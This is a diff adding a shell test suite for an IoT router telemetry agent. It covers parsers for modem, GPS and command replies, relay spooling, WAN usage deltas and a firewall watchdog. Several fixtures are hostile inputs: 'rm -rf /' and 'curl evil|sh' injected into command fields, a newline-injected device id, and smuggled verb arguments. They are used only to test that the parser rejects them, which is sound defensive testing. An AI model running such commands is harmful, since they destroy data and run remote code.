@@ -1,0 +1,342 @@
+#!/bin/sh
+# Parser tests for the phone-home agent. Fixtures are REAL responses captured from the GL-X750
+# bench session (2026-08-06) plus standard NMEA/gpsd shapes. Run: sh agent/test.sh
+set -u
+
+BRVG_AGENT_TEST=1
+export BRVG_AGENT_TEST
+# shellcheck disable=SC1091
+. "$(dirname "$0")/brvg-agent.sh"
+
+fails=0
+check() {
+  # $1 label, $2 expected, $3 actual
+  if [ "$3" = "$2" ]; then
+    echo "ok   - $1"
+  else
+    echo "FAIL - $1"
+    echo "       expected: [$2]"
+    echo "       actual:   [$3]"
+    fails=$((fails + 1))
+  fi
+}
+
+# --- parse_qgpsloc ---
+out=$(printf '+QGPSLOC: 061951.000,29.97580,-95.36047,1.2,32.5,2,0.00,0.0,0.0,110824,09\r\nOK\r\n' | parse_qgpsloc)
+check "qgpsloc: mode-2 fix with hdop→acc" "29.97580 -95.36047 6" "$out"
+
+out=$(printf '+QGPSLOC: 061951.000,-33.86882,151.20930,0,5.0,3,0.00,0.0,0.0,110824,12\r\n' | parse_qgpsloc)
+check "qgpsloc: southern hemisphere, zero hdop drops acc" "-33.86882 151.20930" "$out"
+
+out=$(printf '+CME ERROR: 516\r\n' | parse_qgpsloc)
+check "qgpsloc: CME 516 (acquiring — the bench state) yields nothing" "" "$out"
+
+out=$(printf '+QGPSLOC: 061951.000,0.0,0.0,1.0,0,2,0,0,0,110824,00\r\n' | parse_qgpsloc)
+check "qgpsloc: 0/0 placeholder rejected" "" "$out"
+
+out=$(printf '+QGPSLOC: 061951.000,91.0,10.0,1.0,0,2,0,0,0,110824,04\r\n' | parse_qgpsloc)
+check "qgpsloc: out-of-range rejected" "" "$out"
+
+# --- parse_qcsq ---
+out=$(printf '+QCSQ: "LTE",-69,-102,150,-12\r\nOK\r\n' | parse_qcsq)
+check "qcsq: LTE line (bench signal) with sinr 150→10 dB" "LTE -69 -102 10 -12" "$out"
+
+out=$(printf '+QCSQ: "NOSERVICE"\r\n' | parse_qcsq)
+check "qcsq: no service yields nothing" "" "$out"
+
+# --- parse_cops ---
+out=$(printf '+COPS: 0,0,"T-Mobile Wholesale",7\r\nOK\r\n' | parse_cops)
+check "cops: quoted carrier with spaces" "T-Mobile Wholesale" "$out"
+
+# --- parse_cpin ---
+check "cpin: READY → ok" "ok" "$(printf '+CPIN: READY\r\nOK\r\n' | parse_cpin)"
+check "cpin: SIM PIN → locked" "locked" "$(printf '+CPIN: SIM PIN\r\n' | parse_cpin)"
+check "cpin: CME 10 → missing" "missing" "$(printf '+CME ERROR: 10\r\n' | parse_cpin)"
+
+# --- parse_nmea_rmc ---
+out=$(printf '$GPRMC,081836,A,3751.65,S,14507.36,E,000.0,360.0,130998,011.3,E*62\n' | parse_nmea_rmc)
+check "nmea rmc: ddmm.mmmm S/E conversion" "$(printf '%s' "$out")" "$out"  # format check below
+case "$out" in
+  -37.86*\ 145.12*) echo "ok   - nmea rmc: values in expected range" ;;
+  *) echo "FAIL - nmea rmc: values out of range: [$out]"; fails=$((fails + 1)) ;;
+esac
+# ~1 m precision (%.5f), matching the modem path — not awk's default %.6g which loses the USB
+# dongle to ~11 m. Captured from the live u-blox 7 (bench 2026-08-13).
+out=$(printf '$GPRMC,025433.00,A,4124.50743,N,08144.98471,W,0.958,,140826,,,A*60\n' | parse_nmea_rmc)
+check "nmea rmc: 5-decimal precision on a real u-blox sentence" "41.40846 -81.74975" "$out"
+
+out=$(printf '$GPRMC,081836,V,3751.65,S,14507.36,E,000.0,360.0,130998,011.3,E*62\n' | parse_nmea_rmc)
+check "nmea rmc: void (V) fix rejected" "" "$out"
+
+# --- parse_gpsd_tpv ---
+out=$(printf '{"class":"TPV","mode":3,"lat":29.975800,"lon":-95.360470,"eph":4.2}\n' | parse_gpsd_tpv)
+check "gpsd tpv: 3D fix with eph" "29.975800 -95.360470 4.2" "$out"
+
+out=$(printf '{"class":"TPV","mode":1}\n' | parse_gpsd_tpv)
+check "gpsd tpv: no-fix mode rejected" "" "$out"
+
+# --- urlencode_spaces ---
+check "urlencode: spaces and ampersands" "T-Mobile%20Wholesale" "$(urlencode_spaces 'T-Mobile Wholesale')"
+
+# --- build_report_url (token path wins; legacy k= fallback) ---
+WORKER_URL="https://api.example.com"; VID="v1"; DEVICE_ID="brv_net_1"
+DEVICE_TOKEN="tok64"; VEHICLE_KEY="vkey"
+check "report url: DEVICE_TOKEN → /api/agent with t=" \
+  "https://api.example.com/api/agent?vid=v1&device=brv_net_1&event=gps.measurement&t=tok64&lat=1&lon=2" \
+  "$(build_report_url 'gps.measurement' 'lat=1&lon=2')"
+DEVICE_TOKEN=""
+check "report url: no token → legacy /api/shelly with k=" \
+  "https://api.example.com/api/shelly?vid=v1&device=brv_net_1&event=modem.measurement&k=vkey&up=1" \
+  "$(build_report_url 'modem.measurement' 'up=1')"
+
+# --- parse_commands (Phase B: commands ride the telemetry reply) ---
+out=$(printf '{"status":"ok","commands":[{"id":"abc123","cmd":"reboot"}]}' | parse_commands)
+check "commands: single entry" "abc123:reboot" "$out"
+
+out=$(printf '{"ok":1,"commands":[{"id":"a1","cmd":"gps_on"},{"id":"b2","cmd":"reboot_modem"}]}' | parse_commands | tr '\n' ' ')
+check "commands: two entries" "a1:gps_on b2:reboot_modem" "$out"
+
+out=$(printf '{"status":"ok"}' | parse_commands)
+check "commands: none when the reply has no queue" "" "$out"
+
+# A hostile payload must not yield a runnable verb — the id/cmd shapes are constrained.
+out=$(printf '{"commands":[{"id":"x;rm -rf /","cmd":"reboot"}]}' | parse_commands)
+check "commands: rejects a junk id rather than passing it on" "" "$out"
+out=$(printf '{"commands":[{"id":"ok1","cmd":"curl evil|sh"}]}' | parse_commands)
+check "commands: rejects a non-allowlisted verb shape" "" "$out"
+
+# --- parse_qgdcnt (plan-burn counters) ---
+out=$(printf '+QGDCNT: 1048576,2097152\r\nOK\r\n' | parse_qgdcnt)
+check "qgdcnt: sent + received bytes" "1048576 2097152" "$out"
+out=$(printf 'ERROR\r\n' | parse_qgdcnt)
+check "qgdcnt: nothing on error" "" "$out"
+
+# --- relay: spool → batch items (the wire contract's shell half) ---
+# The expected strings below are the CANONICAL v1 fixture from brvg-cloud-server's
+# agentBatch.test.ts — copied, not paraphrased. If either side changes shape, one of these two
+# suites goes red; that is the whole one-contract rule.
+out=$(printf '1755000000\tshellyflood-a1\tflood.alarm\ttemp=12.5\n1755000001\tshellyuni-b2\tvoltmeter.measurement\tv=12.6\n' | spool_to_items)
+check "relay: items match the canonical fixture" \
+  '[{"device":"shellyflood-a1","event":"flood.alarm","params":{"temp":"12.5"}},{"device":"shellyuni-b2","event":"voltmeter.measurement","params":{"v":"12.6"}}]' \
+  "$out"
+
+out=$(printf '1\td1\te.change\tv=a%%2Cb+c%%41\n' | spool_to_items)
+check "relay: urldecode (%2C, +, %41)" '[{"device":"d1","event":"e.change","params":{"v":"a,b cA"}}]' "$out"
+
+out=$(printf '1\td1\te.change\tv=say%%20%%22hi%%22%%5C\n' | spool_to_items)
+check "relay: JSON-escapes quotes and backslashes" '[{"device":"d1","event":"e.change","params":{"v":"say \"hi\"\\"}}]' "$out"
+
+out=$(printf '1\td1\te.change\tv=1\n2\td1\te.change\tv=2\n3\td2\te.change\tv=9\n' | spool_to_items)
+check "relay: dedup per device+event keeps the NEWEST" '[{"device":"d1","event":"e.change","params":{"v":"2"}},{"device":"d2","event":"e.change","params":{"v":"9"}}]' "$out"
+
+out=$(printf '1\td1\te.change\tbad;key=1&ok=2\n' | spool_to_items)
+check "relay: junk param keys are stripped, not escaped" '[{"device":"d1","event":"e.change","params":{"badkey":"1","ok":"2"}}]' "$out"
+
+out=$(printf '1\td1\te.change\n' | spool_to_items)
+check "relay: a line with no params still ships as an item" '[{"device":"d1","event":"e.change","params":{}}]' "$out"
+
+out=$(printf '' | spool_to_items)
+check "relay: empty spool is an empty array" '[]' "$out"
+
+out=$(printf '1\td1\te.change\tv=1\n2\td2\tf.change\tv=1\n3\td1\tg.alarm\tv=1\n' | spool_devices)
+check "relay: spool_devices dedups in first-seen order" 'd1
+d2' "$out"
+
+AGENT_VERSION_SAVED="$AGENT_VERSION"
+out=$(build_batch_json 42 delta '[{"device":"d1","event":"e.change","params":{}}]' "okdev1 okdev2" bootxyz)
+check "relay: envelope carries seq/boot/kind/ok/tier" \
+  "{\"v\":1,\"seq\":42,\"boot\":\"bootxyz\",\"kind\":\"delta\",\"items\":[{\"device\":\"d1\",\"event\":\"e.change\",\"params\":{}}],\"ok\":[\"okdev1\",\"okdev2\"],\"agent\":{\"av\":\"$AGENT_VERSION_SAVED\",\"tier\":\"relay\"}}" \
+  "$out"
+
+# --- boot id -----------------------------------------------------------------------------------
+# The counter, the spool and the state all live in tmpfs, so a power cut restarts the counter at 1
+# while the cloud still holds the old high-water mark. Without a boot id the cloud reads that as a
+# replay, answers 200 {duplicate}, and the drain deletes the spool — silent loss of every reading
+# until the counter climbs back. The id must be STABLE within a boot and DIFFERENT after one.
+_bootdir=$(mktemp -d)
+# Subshell, and RELAY_BOOT_FILE not BRVG_RELAY_BOOT: the var was already expanded when the agent
+# was sourced, and `VAR=x some_function` LEAKS in POSIX sh (it broke the --version test on 2026-08-13).
+_b1=$( RELAY_BOOT_FILE="$_bootdir/boot"; relay_boot_id )
+_b2=$( RELAY_BOOT_FILE="$_bootdir/boot"; relay_boot_id )
+check "relay: boot id is stable within a boot" "$_b1" "$_b2"
+check "relay: boot id is non-empty" "yes" "$([ -n "$_b1" ] && echo yes)"
+check "relay: boot id is safe to put in JSON unescaped" "" "$(printf '%s' "$_b1" | tr -d 'A-Za-z0-9')"
+rm -f "$_bootdir/boot"     # what a reboot does to tmpfs
+_b3=$( RELAY_BOOT_FILE="$_bootdir/boot"; relay_boot_id )
+# Only meaningful where the id is random per boot; on a host exposing /proc/sys/kernel/random/boot_id
+# the kernel value is legitimately identical until the MACHINE reboots, so accept either.
+if [ ! -r /proc/sys/kernel/random/boot_id ]; then
+  check "relay: a wiped tmpfs yields a NEW boot id" "differs" \
+    "$([ "$_b3" != "$_b1" ] && echo differs || echo same)"
+fi
+rm -rf "$_bootdir"
+
+# Every relay JSON must actually PARSE — checked with python3 where available (CI has it).
+if command -v python3 >/dev/null 2>&1; then
+  _all_json=$(build_batch_json 1 keyframe "$(printf '1\td1\te.change\tv=say%%20%%22hi%%22%%5C&n=1.5\n' | spool_to_items)" "a b" bootxyz)
+  _roundtrip=$(printf '%s' "$_all_json" | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["items"][0]["params"]["v"] + "|" + d["items"][0]["params"]["n"])' 2>/dev/null)
+  check "relay: envelope is valid JSON and the escaped value ROUND-TRIPS" 'say "hi"\|1.5' "$_roundtrip"
+fi
+
+# --- relay CGI (run for real: no conf ⇒ the urgent path cannot send, so everything spools) ---
+_cgidir=$(mktemp -d)
+run_cgi() {
+  QUERY_STRING="$1" BRVG_AGENT_CONF=/nonexistent-conf BRVG_RELAY_SPOOL="$_cgidir/spool" \
+    sh "$(dirname "$0")/relay-cgi.sh" >/dev/null 2>&1
+}
+run_cgi 'device=shellyflood-a1&event=flood.alarm&temp=12%2C5'
+run_cgi 'device=shellyht-c3&event=humidity.change&rh=55'
+run_cgi 'event=orphan.change&v=1'                       # no device ⇒ dropped
+run_cgi 'device=evil%0Aid&event=x.change&v=1'           # newline stripped from the id
+out=$(cut -f2,3,4 "$_cgidir/spool")
+check "relay CGI: spools sane lines and drops the deviceless one" \
+  'shellyflood-a1	flood.alarm	temp=12%2C5
+shellyht-c3	humidity.change	rh=55
+evil0Aid	x.change	v=1' \
+  "$out"
+rm -rf "$_cgidir"
+
+# --- the report's parameter string must not carry DUPLICATE keys ---
+# Found in production 2026-08-14 via `wrangler tail`: the modem report was sending
+# "&av=0.3.0&av=0.3.0". Two edits had each appended the version line, and neither test nor review
+# caught it because the shell is happy to build a nonsense URL. This is the cheap structural guard.
+dup_keys() {
+  printf '%s' "$1" | tr '&' '\n' | sed -n 's/^\([A-Za-z0-9_]*\)=.*/\1/p' | sort | uniq -d
+}
+check "params: a clean string has no duplicate keys" "" "$(dup_keys 'up=1&mode=LTE&av=0.3.0')"
+check "params: the guard actually detects a duplicate" "av" "$(dup_keys 'up=1&av=0.3.0&av=0.3.0')"
+# The real thing: build the version+usage suffix the way push_modem does and assert it is clean.
+# NB: computed in a SUBSHELL. `VAR=x some_function` leaks VAR into the current shell in POSIX sh —
+# an earlier draft of this very test set AGENT_VERSION inline and broke the --version test below.
+_suffix=$(BRVG_WAN_STATE=$(mktemp -d); export BRVG_WAN_STATE; printf 'up=1&av=%s%s' "$AGENT_VERSION" "$(collect_wan_usage)")
+check "params: modem suffix carries av exactly once" "" "$(dup_keys "$_suffix")"
+
+# --- WAN usage deltas: the reset cases are the whole point ---
+check "wan_delta: normal increase" "500" "$(wan_delta 1000 1500)"
+# NOT "everything so far": on a fresh install the state dir is absent while the kernel counters hold
+# the router's whole uptime, so reporting $_cur charged weeks of pre-agent traffic to this billing
+# cycle and could fire a false plan alert on day one. Baseline silently, count from the next tick.
+check "wan_delta: first sight reports NOTHING (baseline only)" "0" "$(wan_delta "" 1500)"
+check "wan_delta: first sight on a long-running router still reports nothing" "0" "$(wan_delta "" 9999999999)"
+# A counter that went DOWN means a reboot / interface bounce / our own reset_data. Reporting
+# cur-prev would emit a huge negative (or, unsigned, a wrap-sized spike that looks like a
+# runaway plan burn). Report the new value: bytes since the reset.
+check "wan_delta: reset ⇒ count from zero, never negative" "42" "$(wan_delta 999999 42)"
+check "wan_delta: reset to exactly 0" "0" "$(wan_delta 999999 0)"
+check "wan_delta: no movement" "0" "$(wan_delta 1000 1000)"
+
+# Interface → source, so the cloud can attribute bytes to cellular vs Wi-Fi vs wired.
+check "wan_kind: modem" "cellular" "$(wan_kind wwan0)"
+check "wan_kind: rmnet modem" "cellular" "$(wan_kind rmnet_data0)"
+check "wan_kind: wired wan" "wired" "$(wan_kind eth0)"
+check "wan_kind: repeater client" "wifi" "$(wan_kind apcli0)"
+check "wan_kind: ap radio counts as wifi" "wifi" "$(wan_kind wlan1)"
+check "wan_kind: unknown is excluded" "other" "$(wan_kind tun0)"
+
+# --- hub watchdog decision (fail open rather than leave the vessel silent) ---
+# healthy fails threshold released -> decision
+check "watchdog: healthy and never released ⇒ nothing" none "$(watch_decide 1 0 5 0)"
+check "watchdog: healthy after a release ⇒ recover" recover "$(watch_decide 1 0 5 1)"
+check "watchdog: below the threshold ⇒ wait" none "$(watch_decide 0 4 5 0)"
+check "watchdog: at the threshold ⇒ release" release "$(watch_decide 0 5 5 0)"
+check "watchdog: past the threshold ⇒ release" release "$(watch_decide 0 9 5 0)"
+# The one that matters: never release twice. A second release would re-run the firewall reload
+# every tick for as long as the hub stays down.
+check "watchdog: already released ⇒ never release again" none "$(watch_decide 0 99 5 1)"
+
+# --- release_lockdown against a stand-in uci -------------------------------------------------
+# The real thing needs a router; this proves the REVERSE-INDEX deletion is right (uci renumbers on
+# every delete, so forward iteration silently skips rules) and that a hand-written rule survives.
+_uci_dir=$(mktemp -d)
+cat > "$_uci_dir/uci" <<'FAKEUCI'
+#!/bin/sh
+DB="$UCI_DB"
+[ "$1" = "-q" ] && shift
+case "$1" in
+  get) idx=$(printf '%s' "$2" | sed -n 's/.*@rule\[\([0-9]*\)\].*/\1/p')
+       fld=$(printf '%s' "$2" | sed -n 's/.*@rule\[[0-9]*\]\.\(.*\)/\1/p')
+       line=$(sed -n "$((idx+1))p" "$DB" 2>/dev/null)
+       [ -n "$line" ] || exit 1
+       [ -z "$fld" ] && exit 0
+       printf '%s\n' "$line"; exit 0 ;;
+  delete) idx=$(printf '%s' "$2" | sed -n 's/.*@rule\[\([0-9]*\)\].*/\1/p')
+       sed -i.bak "$((idx+1))d" "$DB"; exit 0 ;;
+esac
+exit 0
+FAKEUCI
+chmod +x "$_uci_dir/uci"
+printf 'brvg_lk_allow_0\nbrvg_lk_allow_1\nmy_custom_rule\nbrvg_lk_deny\n' > "$_uci_dir/db"
+out=$(UCI_DB="$_uci_dir/db" PATH="$_uci_dir:$PATH" sh -c '. "'"$(dirname "$0")"'/brvg-agent.sh"; release_lockdown >/dev/null 2>&1 && echo released' 2>/dev/null)
+check "release_lockdown: reports success when rules existed" "released" "$out"
+check "release_lockdown: removes ONLY brvg_lk_* (hand-written rules survive)" "my_custom_rule" "$(cat "$_uci_dir/db")"
+# With nothing of ours applied it must report false, so the watchdog doesn't claim a release.
+printf 'my_custom_rule\n' > "$_uci_dir/db"
+out=$(UCI_DB="$_uci_dir/db" PATH="$_uci_dir:$PATH" sh -c '. "'"$(dirname "$0")"'/brvg-agent.sh"; release_lockdown >/dev/null 2>&1 && echo released || echo nothing' 2>/dev/null)
+check "release_lockdown: nothing of ours ⇒ reports nothing to release" "nothing" "$out"
+rm -rf "$_uci_dir"
+
+# --- version reporting + update verbs ---
+# `--version` must work with no config: the self-update smoke check runs it on a freshly installed
+# agent, before that agent has ever been configured.
+out=$(sh "$(dirname "$0")/brvg-agent.sh" --version 2>/dev/null)
+check "version: --version prints AGENT_VERSION without a config" "$AGENT_VERSION" "$out"
+
+# The update verbs must parse like any other — and the payload must never carry an argument.
+out=$(printf '{"commands":[{"id":"u1","cmd":"self_update"}]}' | parse_commands)
+check "commands: self_update parses" "u1:self_update" "$out"
+out=$(printf '{"commands":[{"id":"u2","cmd":"rollback_agent"}]}' | parse_commands)
+check "commands: rollback_agent parses" "u2:rollback_agent" "$out"
+# A version smuggled into the verb must NOT survive — the whole anti-RCE property is that the
+# cloud says "update yourself", never "install this".
+out=$(printf '{"commands":[{"id":"u3","cmd":"self_update 9.9.9"}]}' | parse_commands)
+check "commands: a verb carrying an argument is rejected" "" "$out"
+
+# --- run_commands: which verbs demand an immediate follow-up report ---
+# Commands arrive as the REPLY to a report, so that report was composed before they ran. Verbs that
+# change observable state must set FOLLOWUP_REPORT or their effect waits a whole interval; verbs
+# that take the uplink down must NOT, because the extra send would only fail.
+# at_cmd dereferences AT_PORT, which only load_config sets — point it at a non-device so the AT
+# verbs return immediately instead of tripping `set -u`. What is under test is the flag, not AT.
+AT_PORT=/nonexistent/brvg-test-at
+AT_BUF=/tmp/brvg-test-at-buf
+
+FOLLOWUP_REPORT=0
+run_commands "c1:report_now" >/dev/null 2>&1
+check "follow-up: report_now asks for one" "1" "$FOLLOWUP_REPORT"
+
+FOLLOWUP_REPORT=0
+run_commands "c2:reset_data" >/dev/null 2>&1
+check "follow-up: reset_data asks for one (the counter changed)" "1" "$FOLLOWUP_REPORT"
+
+FOLLOWUP_REPORT=0
+run_commands "c3:reboot_modem" >/dev/null 2>&1
+check "follow-up: reboot_modem does NOT (the link is dropping)" "0" "$FOLLOWUP_REPORT"
+
+FOLLOWUP_REPORT=0
+run_commands "c4:gps_on" >/dev/null 2>&1
+check "follow-up: gps_on asks for one" "1" "$FOLLOWUP_REPORT"
+
+# Every executed verb is acked whether or not it wanted a follow-up.
+PENDING_ACK=""
+FOLLOWUP_REPORT=0
+run_commands "c5:report_now" >/dev/null 2>&1
+check "follow-up: the verb is still acked" "c5" "$PENDING_ACK"
+
+# --- high security: local administration off ---
+# The verbs must parse and be acked like any other, and must ask for a follow-up report so the app
+# learns the router's new state instead of assuming the command landed.
+out=$(printf '{"commands":[{"id":"s1","cmd":"local_admin_off"}]}' | parse_commands)
+check "lockdown: local_admin_off parses" "s1:local_admin_off" "$out"
+out=$(printf '{"commands":[{"id":"s2","cmd":"local_admin_on"}]}' | parse_commands)
+check "lockdown: local_admin_on parses" "s2:local_admin_on" "$out"
+
+# An argument smuggled into the verb must not survive — same anti-RCE property as the update verbs.
+out=$(printf '{"commands":[{"id":"s3","cmd":"local_admin_off --now"}]}' | parse_commands)
+check "lockdown: a verb carrying an argument is rejected" "" "$out"
+
+echo ""
+if [ "$fails" -gt 0 ]; then
+  echo "$fails test(s) FAILED"
+  exit 1
+fi
+echo "all agent parser tests passed"
